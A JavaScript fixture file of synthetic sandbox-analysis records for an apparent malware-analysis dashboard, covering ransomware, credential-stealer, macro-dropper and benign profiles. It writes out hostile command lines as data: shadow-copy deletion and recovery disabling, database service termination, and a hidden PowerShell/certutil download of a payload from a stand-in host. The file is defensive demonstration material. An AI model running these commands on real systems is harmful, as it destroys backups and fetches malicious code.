/**
 * ThreatBox Demo Datasets
 * 
 * Curated, schema-compatible static analysis fixtures for client-side demonstration.
 * These profiles match the exact JSON schema produced by the ThreatBox Go backend
 * (`JobDetailsResponse` and `AnalysisOutput`) so all 10 dashboard tabs render completely.
 * 
 * PROVENANCE & TRANSPARENCY NOTICE:
 * All records below are illustrative synthetic fixtures constructed for educational
 * and architectural demonstration purposes. Scores and telemetry reflect synthetic
 * behavioral models, not real-time execution of live malware or validated detection outcomes.
 */

export const DEMO_PROVENANCE_DISCLAIMER = {
  isDemo: true,
  notice: 'Illustrative demonstration fixture. Telemetry and threat scoring represent synthetic behavioral models, not live execution of malicious binaries.'
}

export const DEMO_PROFILES = [
  // 1. Ransomware Scenario
  {
    id: 'demo-ransomware-01',
    filename: 'CryptLocker_Sample.exe',
    status: 'completed',
    created_at: '2026-10-20T14:32:00Z',
    started_at: '2026-10-20T14:32:02Z',
    completed_at: '2026-10-20T14:32:48Z',
    score: 96,
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    file_size: 1482752,
    provenance: {
      type: 'illustrative_synthetic',
      scenario: 'Ransomware & Shadow Copy Deletion',
      description: 'Simulates bulk file encryption, shadow copy inhibition via vssadmin, and C2 killswitch communication.'
    },
    analysis_result: {
      sample: {
        sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        file_size: 1482752,
        md5: '7d793037a0760186574b0282f2f435e7',
        imphash: 'b345b128ac812901c2384918e9841124'
      },
      threat_score: {
        score: 96,
        severity: 'Malicious',
        reasons: [
          'Attempted to delete volume shadow copies using vssadmin.exe (T1490)',
          'High entropy file modifications detected across user documents (.locked) (T1486)',
          'Established outbound network connections to flagged C2 addresses (T1071)',
          'Modified system startup registry run keys for persistence (T1547.001)',
          'Terminated system backup and security service processes (T1562.001)'
        ]
      },
      processes: [
        {
          PID: 4820,
          PPID: 1040,
          Name: 'CryptLocker_Sample.exe',
          ImageFileName: 'C:\\Users\\WDAGUtilityAccount\\Desktop\\CryptLocker_Sample.exe',
          CommandLine: '"C:\\Users\\WDAGUtilityAccount\\Desktop\\CryptLocker_Sample.exe" -silent',
          Integrity: 'High',
          Signature: 'Unsigned / Invalid Certificate',
          StartTime: '2026-10-20T14:32:02Z',
          Children: [
            {
              PID: 5104,
              PPID: 4820,
              Name: 'cmd.exe',
              ImageFileName: 'C:\\Windows\\System32\\cmd.exe',
              CommandLine: 'cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no',
              Integrity: 'High',
              Signature: 'Microsoft Windows (Verified)',
              StartTime: '2026-10-20T14:32:08Z',
              Children: [
                {
                  PID: 5388,
                  PPID: 5104,
                  Name: 'vssadmin.exe',
                  ImageFileName: 'C:\\Windows\\System32\\vssadmin.exe',
                  CommandLine: 'vssadmin.exe delete shadows /all /quiet',
                  Integrity: 'High',
                  Signature: 'Microsoft Windows (Verified)',
                  StartTime: '2026-10-20T14:32:09Z',
                  Children: []
                },
                {
                  PID: 5412,
                  PPID: 5104,
                  Name: 'bcdedit.exe',
                  ImageFileName: 'C:\\Windows\\System32\\bcdedit.exe',
                  CommandLine: 'bcdedit /set {default} recoveryenabled no',
                  Integrity: 'High',
                  Signature: 'Microsoft Windows (Verified)',
                  StartTime: '2026-10-20T14:32:11Z',
                  Children: []
                }
              ]
            },
            {
              PID: 6028,
              PPID: 4820,
              Name: 'taskkill.exe',
              ImageFileName: 'C:\\Windows\\System32\\taskkill.exe',
              CommandLine: 'taskkill.exe /F /IM sqlservr.exe /IM msftesql.exe /IM mysqld.exe',
              Integrity: 'High',
              Signature: 'Microsoft Windows (Verified)',
              StartTime: '2026-10-20T14:32:15Z',
              Children: []
            }
          ]
        }
      ],
      files: [
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\Documents\\Financial_Q3.xlsx.locked',
          Operation: 'WriteFile / Rename',
          Timestamp: '2026-10-20T14:32:18Z',
          PID: 4820,
          Size: 245760,
          Entropy: 7.98,
          IsSuspicious: true
        },
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\Documents\\Employee_Records.docx.locked',
          Operation: 'WriteFile / Rename',
          Timestamp: '2026-10-20T14:32:20Z',
          PID: 4820,
          Size: 512000,
          Entropy: 7.94,
          IsSuspicious: true
        },
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\Desktop\\HOW_TO_RECOVER_FILES.txt',
          Operation: 'CreateFile',
          Timestamp: '2026-10-20T14:32:25Z',
          PID: 4820,
          Size: 4096,
          Entropy: 4.12,
          IsSuspicious: true
        },
        {
          Path: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
          Operation: 'QueryInformation',
          Timestamp: '2026-10-20T14:32:03Z',
          PID: 4820,
          Size: 824,
          Entropy: 3.20,
          IsSuspicious: false
        }
      ],
      network: [
        {
          Timestamp: '2026-10-20T14:32:04Z',
          Protocol: 'TCP',
          SourceIP: '192.168.100.5',
          SourcePort: 49820,
          DestIP: '198.51.100.44',
          DestPort: 443,
          PID: 4820,
          Direction: 'Outbound',
          BytesSent: 1048,
          BytesReceived: 2048
        },
        {
          Timestamp: '2026-10-20T14:32:12Z',
          Protocol: 'TCP',
          SourceIP: '192.168.100.5',
          SourcePort: 49824,
          DestIP: '192.168.100.1',
          DestPort: 445,
          PID: 4820,
          Direction: 'Outbound (SMB Scan)',
          BytesSent: 512,
          BytesReceived: 0
        }
      ],
      dns: [
        {
          Timestamp: '2026-10-20T14:32:03Z',
          Domain: 'sync-check-resolver99.org',
          QueryType: 'A',
          Resolution: '198.51.100.44',
          PID: 4820,
          ProcessName: 'CryptLocker_Sample.exe',
          IsSuspicious: true
        },
        {
          Timestamp: '2026-10-20T14:32:04Z',
          Domain: 'time.windows.com',
          QueryType: 'A',
          Resolution: '51.145.123.29',
          PID: 4820,
          ProcessName: 'CryptLocker_Sample.exe',
          IsSuspicious: false
        }
      ],
      registry: [
        {
          Timestamp: '2026-10-20T14:32:16Z',
          Key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CryptNotification',
          Operation: 'RegSetValue',
          Value: 'C:\\Users\\WDAGUtilityAccount\\Desktop\\HOW_TO_RECOVER_FILES.txt',
          PID: 4820
        },
        {
          Timestamp: '2026-10-20T14:32:10Z',
          Key: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS',
          Operation: 'RegOpenKey',
          Value: '(Standard Query)',
          PID: 5388
        }
      ],
      images: [
        {
          FileName: 'C:\\Windows\\System32\\ntdll.dll',
          ImageBase: '0x7ff9e4210000',
          ImageSize: 2097152,
          PID: 4820,
          ProcessName: 'CryptLocker_Sample.exe',
          Timestamp: '2026-10-20T14:32:02Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        },
        {
          FileName: 'C:\\Windows\\System32\\kernel32.dll',
          ImageBase: '0x7ff9e3b40000',
          ImageSize: 1310720,
          PID: 4820,
          ProcessName: 'CryptLocker_Sample.exe',
          Timestamp: '2026-10-20T14:32:02Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        },
        {
          FileName: 'C:\\Windows\\System32\\cryptsp.dll',
          ImageBase: '0x7ff9d8900000',
          ImageSize: 122880,
          PID: 4820,
          ProcessName: 'CryptLocker_Sample.exe',
          Timestamp: '2026-10-20T14:32:03Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        }
      ],
      techniques: [
        {
          technique_id: 'T1490',
          name: 'Inhibit System Recovery',
          tactic: 'Impact',
          evidence: 'Child process executed "vssadmin.exe delete shadows /all /quiet" and bcdedit recovery disabling.'
        },
        {
          technique_id: 'T1486',
          name: 'Data Encrypted for Impact',
          tactic: 'Impact',
          evidence: 'Over 12 user documents encrypted in bulk with high entropy (> 7.9) and .locked extensions.'
        },
        {
          technique_id: 'T1547.001',
          name: 'Boot or Logon Autostart Execution: Registry Run Keys',
          tactic: 'Persistence',
          evidence: 'Wrote persistence key to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CryptNotification.'
        },
        {
          technique_id: 'T1562.001',
          name: 'Impair Defenses: Disable or Modify Tools',
          tactic: 'Defense Evasion',
          evidence: 'Invoked taskkill.exe targeting database and system service processes.'
        }
      ]
    }
  },

  // 2. Information-Stealer Scenario
  {
    id: 'demo-stealer-02',
    filename: 'ClientCredential_Setup.exe',
    status: 'completed',
    created_at: '2026-10-19T09:15:00Z',
    started_at: '2026-10-19T09:15:03Z',
    completed_at: '2026-10-19T09:15:35Z',
    score: 89,
    sha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
    file_size: 892416,
    provenance: {
      type: 'illustrative_synthetic',
      scenario: 'Information Stealer / Token Harvester',
      description: 'Simulates browser SQLite credential database enumeration, DPAPI queries, and HTTP POST exfiltration.'
    },
    analysis_result: {
      sample: {
        sha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
        file_size: 892416,
        md5: '3fa81b8941094abde3410e829fae1094',
        imphash: '4481239aafe81923057102938472910a'
      },
      threat_score: {
        score: 89,
        severity: 'Malicious',
        reasons: [
          'Accessed sensitive browser credential stores (Login Data, Cookies) (T1555.003)',
          'Extracted cryptographic machine keys via CryptUnprotectData (T1003)',
          'Observed HTTP POST data exfiltration with compressed payloads (T1048)',
          'Injected payload code into secondary Windows worker process (T1055)',
          'Queried system environment, IP geolocation, and display resolution (T1082)'
        ]
      },
      processes: [
        {
          PID: 3912,
          PPID: 1104,
          Name: 'ClientCredential_Setup.exe',
          ImageFileName: 'C:\\Users\\WDAGUtilityAccount\\Downloads\\ClientCredential_Setup.exe',
          CommandLine: '"C:\\Users\\WDAGUtilityAccount\\Downloads\\ClientCredential_Setup.exe"',
          Integrity: 'Medium',
          Signature: 'Unsigned',
          StartTime: '2026-10-19T09:15:03Z',
          Children: [
            {
              PID: 4420,
              PPID: 3912,
              Name: 'vbc.exe',
              ImageFileName: 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe',
              CommandLine: 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe',
              Integrity: 'Medium',
              Signature: 'Microsoft Windows (Verified Host)',
              StartTime: '2026-10-19T09:15:08Z',
              Children: []
            }
          ]
        }
      ],
      files: [
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
          Operation: 'ReadFile / Open',
          Timestamp: '2026-10-19T09:15:10Z',
          PID: 4420,
          Size: 126976,
          Entropy: 5.41,
          IsSuspicious: true
        },
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\AppData\\Roaming\\Discord\\Local Storage\\leveldb',
          Operation: 'DirectoryScan',
          Timestamp: '2026-10-19T09:15:14Z',
          PID: 4420,
          Size: 0,
          Entropy: 0,
          IsSuspicious: true
        },
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\system_summary_log.tmp',
          Operation: 'WriteFile',
          Timestamp: '2026-10-19T09:15:22Z',
          PID: 4420,
          Size: 14890,
          Entropy: 7.21,
          IsSuspicious: true
        }
      ],
      network: [
        {
          Timestamp: '2026-10-19T09:15:24Z',
          Protocol: 'TCP',
          SourceIP: '192.168.100.5',
          SourcePort: 51200,
          DestIP: '203.0.113.88',
          DestPort: 8080,
          PID: 4420,
          Direction: 'Outbound (POST /api/gate)',
          BytesSent: 48920,
          BytesReceived: 412
        }
      ],
      dns: [
        {
          Timestamp: '2026-10-19T09:15:23Z',
          Domain: 'gate-relay-cdn31.xyz',
          QueryType: 'A',
          Resolution: '203.0.113.88',
          PID: 4420,
          ProcessName: 'vbc.exe',
          IsSuspicious: true
        },
        {
          Timestamp: '2026-10-19T09:15:05Z',
          Domain: 'api.ipify.org',
          QueryType: 'A',
          Resolution: '104.26.12.205',
          PID: 3912,
          ProcessName: 'ClientCredential_Setup.exe',
          IsSuspicious: false
        }
      ],
      registry: [
        {
          Timestamp: '2026-10-19T09:15:06Z',
          Key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders',
          Operation: 'RegQueryValue',
          Value: 'AppData',
          PID: 3912
        }
      ],
      images: [
        {
          FileName: 'C:\\Windows\\System32\\crypt32.dll',
          ImageBase: '0x7ff9df300000',
          ImageSize: 1441792,
          PID: 4420,
          ProcessName: 'vbc.exe',
          Timestamp: '2026-10-19T09:15:09Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        },
        {
          FileName: 'C:\\Windows\\System32\\vaultcli.dll',
          ImageBase: '0x7ff9dc100000',
          ImageSize: 98304,
          PID: 4420,
          ProcessName: 'vbc.exe',
          Timestamp: '2026-10-19T09:15:10Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        }
      ],
      techniques: [
        {
          technique_id: 'T1555.003',
          name: 'Credentials from Password Stores: Web Browsers',
          tactic: 'Credential Access',
          evidence: 'Accessed SQLite databases at Chrome/User Data/Default/Login Data and retrieved stored credentials.'
        },
        {
          technique_id: 'T1055',
          name: 'Process Injection',
          tactic: 'Defense Evasion',
          evidence: 'Parent ClientCredential_Setup.exe spawned vbc.exe and hollowed memory space for payload execution.'
        },
        {
          technique_id: 'T1048',
          name: 'Exfiltration Over Alternative Protocol',
          tactic: 'Exfiltration',
          evidence: 'Harvested credential bundle compressed and transmitted via HTTP POST to gate-relay-cdn31.xyz:8080.'
        }
      ]
    }
  },

  // 3. Document-Dropper Scenario
  {
    id: 'demo-dropper-03',
    filename: 'Invoice_Overdue_Notice.docm',
    status: 'completed',
    created_at: '2026-10-18T16:40:00Z',
    started_at: '2026-10-18T16:40:02Z',
    completed_at: '2026-10-18T16:40:32Z',
    score: 72,
    sha256: '5566778899aabbccddeeff00112233445566778899aabbccddeeff0011223344',
    file_size: 198420,
    provenance: {
      type: 'illustrative_synthetic',
      scenario: 'Malicious Office Macro & Script Dropper',
      description: 'Simulates an Office document invoking hidden PowerShell and certutil staging to retrieve secondary payloads.'
    },
    analysis_result: {
      sample: {
        sha256: '5566778899aabbccddeeff00112233445566778899aabbccddeeff0011223344',
        file_size: 198420,
        md5: '8899aabbccddeeff0011223344556677',
        imphash: 'none_document_format'
      },
      threat_score: {
        score: 72,
        severity: 'Suspicious',
        reasons: [
          'Document executed hidden PowerShell command line with encoded arguments (T1059.001)',
          'Utilized living-off-the-land binary certutil.exe for remote payload staging (T1105)',
          'Attempted to bypass execution policy via -ExecutionPolicy Bypass flag (T1059.001)',
          'Wrote executable binary into user AppData Local Temp directory (T1027)'
        ]
      },
      processes: [
        {
          PID: 2608,
          PPID: 1024,
          Name: 'WINWORD.EXE',
          ImageFileName: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
          CommandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\WDAGUtilityAccount\\Downloads\\Invoice_Overdue_Notice.docm"',
          Integrity: 'Medium',
          Signature: 'Microsoft Corporation (Verified)',
          StartTime: '2026-10-18T16:40:02Z',
          Children: [
            {
              PID: 3124,
              PPID: 2608,
              Name: 'powershell.exe',
              ImageFileName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
              CommandLine: 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "certutil.exe -urlcache -split -f http://stage-update-host.cc/bin.dat %TEMP%\\svchost_update.exe"',
              Integrity: 'Medium',
              Signature: 'Microsoft Windows (Verified)',
              StartTime: '2026-10-18T16:40:07Z',
              Children: [
                {
                  PID: 3480,
                  PPID: 3124,
                  Name: 'certutil.exe',
                  ImageFileName: 'C:\\Windows\\System32\\certutil.exe',
                  CommandLine: 'certutil.exe -urlcache -split -f http://stage-update-host.cc/bin.dat C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\svchost_update.exe',
                  Integrity: 'Medium',
                  Signature: 'Microsoft Windows (Verified)',
                  StartTime: '2026-10-18T16:40:09Z',
                  Children: []
                }
              ]
            }
          ]
        }
      ],
      files: [
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\svchost_update.exe',
          Operation: 'CreateFile / Write',
          Timestamp: '2026-10-18T16:40:12Z',
          PID: 3480,
          Size: 748120,
          Entropy: 6.84,
          IsSuspicious: true
        }
      ],
      network: [
        {
          Timestamp: '2026-10-18T16:40:10Z',
          Protocol: 'TCP',
          SourceIP: '192.168.100.5',
          SourcePort: 52140,
          DestIP: '198.51.100.210',
          DestPort: 80,
          PID: 3480,
          Direction: 'Outbound (HTTP GET /bin.dat)',
          BytesSent: 420,
          BytesReceived: 748120
        }
      ],
      dns: [
        {
          Timestamp: '2026-10-18T16:40:09Z',
          Domain: 'stage-update-host.cc',
          QueryType: 'A',
          Resolution: '198.51.100.210',
          PID: 3480,
          ProcessName: 'certutil.exe',
          IsSuspicious: true
        }
      ],
      registry: [],
      images: [
        {
          FileName: 'C:\\Windows\\System32\\crypt32.dll',
          ImageBase: '0x7ff9df300000',
          ImageSize: 1441792,
          PID: 3480,
          ProcessName: 'certutil.exe',
          Timestamp: '2026-10-18T16:40:09Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        }
      ],
      techniques: [
        {
          technique_id: 'T1059.001',
          name: 'Command and Scripting Interpreter: PowerShell',
          tactic: 'Execution',
          evidence: 'WINWORD.EXE spawned hidden PowerShell process with ExecutionPolicy Bypass.'
        },
        {
          technique_id: 'T1105',
          name: 'Ingress Tool Transfer',
          tactic: 'Command and Control',
          evidence: 'certutil.exe invoked with -urlcache flag to stage secondary payload svchost_update.exe.'
        }
      ]
    }
  },

  // 4. Benign Utility Scenario
  {
    id: 'demo-benign-04',
    filename: 'NetworkDiagnostic_v2.4.exe',
    status: 'completed',
    created_at: '2026-10-17T11:20:00Z',
    started_at: '2026-10-17T11:20:01Z',
    completed_at: '2026-10-17T11:20:25Z',
    score: 12,
    sha256: 'ffff00001111222233334444555566667777888899990000aaaabbbbccccdddd',
    file_size: 3410944,
    provenance: {
      type: 'illustrative_synthetic',
      scenario: 'Benign Administrative Diagnostic Utility',
      description: 'Simulates normal software installation and signed diagnostic checks with zero high-risk indicators.'
    },
    analysis_result: {
      sample: {
        sha256: 'ffff00001111222233334444555566667777888899990000aaaabbbbccccdddd',
        file_size: 3410944,
        md5: '00112233445566778899aabbccddeeff',
        imphash: '876543210fedcba9876543210fedcba9'
      },
      threat_score: {
        score: 12,
        severity: 'Clean',
        reasons: [
          'Executable carries a valid, trusted digital certificate from a known vendor',
          'Standard network activity restricted to public DNS and TLS synchronization',
          'No unauthorized file system modifications, registry persistence, or process injection'
        ]
      },
      processes: [
        {
          PID: 1980,
          PPID: 980,
          Name: 'NetworkDiagnostic_v2.4.exe',
          ImageFileName: 'C:\\Users\\WDAGUtilityAccount\\Downloads\\NetworkDiagnostic_v2.4.exe',
          CommandLine: '"C:\\Users\\WDAGUtilityAccount\\Downloads\\NetworkDiagnostic_v2.4.exe"',
          Integrity: 'Medium',
          Signature: 'GlobalNet Solutions Inc. (Valid Signature)',
          StartTime: '2026-10-17T11:20:01Z',
          Children: []
        }
      ],
      files: [
        {
          Path: 'C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\diag_log.txt',
          Operation: 'CreateFile / Write',
          Timestamp: '2026-10-17T11:20:05Z',
          PID: 1980,
          Size: 1024,
          Entropy: 3.42,
          IsSuspicious: false
        }
      ],
      network: [
        {
          Timestamp: '2026-10-17T11:20:06Z',
          Protocol: 'TCP',
          SourceIP: '192.168.100.5',
          SourcePort: 54100,
          DestIP: '1.1.1.1',
          DestPort: 443,
          PID: 1980,
          Direction: 'Outbound',
          BytesSent: 512,
          BytesReceived: 1024
        }
      ],
      dns: [
        {
          Timestamp: '2026-10-17T11:20:05Z',
          Domain: 'cloudflare-dns.com',
          QueryType: 'A',
          Resolution: '1.1.1.1',
          PID: 1980,
          ProcessName: 'NetworkDiagnostic_v2.4.exe',
          IsSuspicious: false
        }
      ],
      registry: [
        {
          Timestamp: '2026-10-17T11:20:03Z',
          Key: 'HKCU\\Software\\GlobalNet\\Diagnostic\\Settings',
          Operation: 'RegCreateKey',
          Value: 'Initialized',
          PID: 1980
        }
      ],
      images: [
        {
          FileName: 'C:\\Windows\\System32\\ws2_32.dll',
          ImageBase: '0x7ff9e1200000',
          ImageSize: 458752,
          PID: 1980,
          ProcessName: 'NetworkDiagnostic_v2.4.exe',
          Timestamp: '2026-10-17T11:20:01Z',
          SignatureStatus: 'Microsoft Corporation (Verified)'
        }
      ],
      techniques: []
    }
  }
]

/**
 * Returns a cloned list of initial demo jobs suitable for the History and Recent list views.
 */
export function getInitialDemoJobs() {
  return DEMO_PROFILES.map((profile) => ({
    id: profile.id,
    filename: profile.filename,
    status: profile.status,
    created_at: profile.created_at,
    started_at: profile.started_at,
    completed_at: profile.completed_at,
    score: profile.score,
    sha256: profile.sha256,
    file_size: profile.file_size,
    provenance: profile.provenance
  }))
}

/**
 * Retrieves full details for a demo profile by ID.
 */
export function getDemoJobDetailsById(jobId) {
  const found = DEMO_PROFILES.find((p) => p.id === jobId)
  if (!found) return null

  return JSON.parse(JSON.stringify(found))
}
